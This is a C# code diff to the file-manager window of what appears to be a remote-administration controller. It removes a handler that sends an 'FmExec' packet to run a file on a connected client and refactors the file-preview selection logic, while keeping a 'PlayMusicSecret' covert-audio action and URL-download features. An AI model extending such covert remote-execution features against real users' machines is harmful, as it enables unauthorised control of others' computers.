@@ -146,7 +146,6 @@ public partial class FileManagerWindow : ThemedWindow
         if (MnuFmShowHide    != null) MnuFmShowHide.Header    = Lang.Get("FM_SHOW_HIDE");
         if (MnuFmSetAttr     != null) MnuFmSetAttr.Header     = Lang.Get("FM_SET_ATTR");
         if (MnuFmWallpaper   != null) MnuFmWallpaper.Header   = Lang.Get("FM_WALLPAPER");
-        if (MnuFmPlayMusic       != null) MnuFmPlayMusic.Header       = Lang.Get("FM_PLAY_MUSIC");
         if (MnuFmPlayMusicSecret != null) MnuFmPlayMusicSecret.Header = Lang.Get(_isPlayingAudio ? "FM_STOP_AUDIO" : "FM_PLAY_MUSIC_SECRET");
         if (MnuFmZip             != null) MnuFmZip.Header             = Lang.Get("FM_ZIP");
         if (MnuFmDownloadUrl != null) MnuFmDownloadUrl.Header = Lang.Get("FM_DOWNLOAD_URL");
@@ -910,31 +909,6 @@ public partial class FileManagerWindow : ThemedWindow
         }
     }
 
-    private async void PlayMusic_Click(object s, RoutedEventArgs e)
-    {
-        if (GridFiles.SelectedItem is not FileEntryVM row || row.IsDir) return;
-        var path = Path.Combine(_currentPath, row.Name);
-
-        ServerWindow.ReportGlobalActivity("Play audio", row.Name, "running");
-        ServerWindow.LogGlobal($"[FM] Playing audio file '{path}' on client {_clientId}...");
-
-        try
-        {
-            await _server.SendToClient(_clientId, new Packet
-            {
-                Type = PacketType.FmExec,
-                Data = JsonConvert.SerializeObject(new FmExecData { Path = path, Mode = "normal" })
-            });
-            TxtStatus.Text = string.Format(Lang.Get("FM_PLAYING"), row.Name);
-            ServerWindow.ReportGlobalActivity("Play audio", row.Name, "complete");
-        }
-        catch (Exception ex)
-        {
-            TxtStatus.Text = string.Format(Lang.Get("ERR_GENERIC"), ex.Message);
-            ServerWindow.ReportGlobalActivity("Play audio", row.Name, "failed");
-        }
-    }
-
     private async void PlayMusicSecret_Click(object s, RoutedEventArgs e)
     {
         if (_isPlayingAudio)
@@ -1285,20 +1259,28 @@ public partial class FileManagerWindow : ThemedWindow
 
     private void GridFiles_SelectionChanged(object s, System.Windows.Controls.SelectionChangedEventArgs e)
     {
-        if (GridFiles.SelectedItem is not FileEntryVM vm || vm.IsDir)
+        int count = GridFiles.SelectedItems.Count;
+        if (count > 1)
         {
-            TxtPreviewName.Text = GridFiles.SelectedItems.Count > 1
-                ? $"{GridFiles.SelectedItems.Count} items selected"
-                : "No file selected";
+            TxtPreviewName.Text  = $"{count} items selected";
             BtnPreview.IsEnabled = false;
             _previewIsPlaceholder = true;
-            TxtPreviewInfo.Text = Lang.Get("FM_SELECT_FILE");
+            TxtPreviewInfo.Text  = Lang.Get("FM_SELECT_FILE");
             ShowPreviewPanel("empty");
             return;
         }
-        TxtPreviewName.Text = vm.Name;
+        if (GridFiles.SelectedItem is not FileEntryVM vm || vm.IsDir)
+        {
+            TxtPreviewName.Text  = "No file selected";
+            BtnPreview.IsEnabled = false;
+            _previewIsPlaceholder = true;
+            TxtPreviewInfo.Text  = Lang.Get("FM_SELECT_FILE");
+            ShowPreviewPanel("empty");
+            return;
+        }
+        TxtPreviewName.Text  = vm.Name;
         BtnPreview.IsEnabled = true;
-        // Auto-preview for images, text, and small videos (< 30 MB)
+        // Auto-preview only for single selection — never during rubber-band drag
         // .webp excluded — WPF BitmapImage has no native WEBP decoder
         // .mkv/.webm excluded — WMF has no built-in codec on stock Windows
         var ext = Path.GetExtension(vm.Name).ToLowerInvariant();
